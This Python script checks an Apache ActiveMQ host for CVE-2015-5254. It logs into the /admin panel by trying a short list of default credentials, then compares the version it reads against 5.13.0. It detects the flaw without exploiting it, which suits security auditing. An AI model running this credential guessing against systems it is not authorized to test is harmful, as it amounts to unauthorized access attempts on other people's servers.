try:
    import base64,requests,re,logging,os
    logging.basicConfig(level= logging.INFO,format = "%(message)s")
except Exception as e:
    logging.info("[*] {}".format(e))
    os._exit(6)
def cve_2015_5254_poc(ip,port):
        target ="http://" + ip + ":" + port
        passlist = ["admin:123456", "admin:admin", "admin:123123", "admin:activemq", "admin:12345678"]
        ver = 5555
    
        try:
            for pa in passlist:
                base64_p = base64.b64encode(str.encode(pa))
                p = base64_p.decode('utf-8')
                headers_base64 = {
                    'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36",
                    'Authorization': 'Basic ' + p
                }
                request = requests.get(target + "/admin", headers=headers_base64, timeout=3,
                                            verify=False)
                # rawdata = dump.dump_all(request).decode('utf-8', 'ignore')
                if request.status_code == 200:
                    get_ver = re.findall("<td><b>(.*)</b></td>", request.text)[1]
                    ver = get_ver.replace(".", "")
                    if int(ver) < 5130:
                        logging.info("[+] {} find cve2015-5254".format(ip))
                        os._exit(1)
            logging.info("[-] {} do not found cve-2015-5254".format(ip))
            os._exit(2)
        except IndexError:
            pass
if __name__ =="__main__":
    import sys
    ip = sys.argv[1]
    port = sys.argv[2]
    cve_2015_5254_poc(ip,port)